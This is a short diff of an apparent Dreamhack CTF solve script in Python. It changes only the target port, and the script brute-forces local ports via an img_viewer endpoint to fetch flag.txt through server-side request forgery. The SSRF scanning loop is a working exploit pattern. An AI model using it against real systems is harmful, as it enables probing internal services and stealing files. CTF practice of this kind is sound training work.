@@ -16,7 +16,7 @@ res = None
 port = 0
 flag = ''
 flag_found = 0
-url = 'http://host1.dreamhack.games:{}/img_viewer'.format(11599)
+url = 'http://host1.dreamhack.games:{}/img_viewer'.format(20092)
 for p in tqdm.tqdm(range(1500, 1800)):
     param = {'url' : 'http://LOCALHOST:{}/flag.txt'.format(p)}
     res = requests.post(url, data=param)
